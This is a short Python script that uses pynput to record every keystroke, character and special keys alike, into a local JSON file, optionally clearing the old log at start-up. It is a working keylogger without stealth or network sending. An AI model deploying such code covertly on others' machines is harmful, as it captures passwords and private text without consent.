import json
from pynput import keyboard

DELETE_PREV_CODE = True

def add_to_json(obj):
    try:
        with open("logged.json", "r") as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = []
    data.append(obj)
    with open("logged.json", "w") as file:
        json.dump(data, file, indent=4)

def delete_all():
    open('logged.json', 'w').close()

def on_press(key):
    try:
        add_to_json({"key": key.char})
    except AttributeError:
        add_to_json({"special": str(key)})


if (DELETE_PREV_CODE):
    delete_all()
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
    print(listener)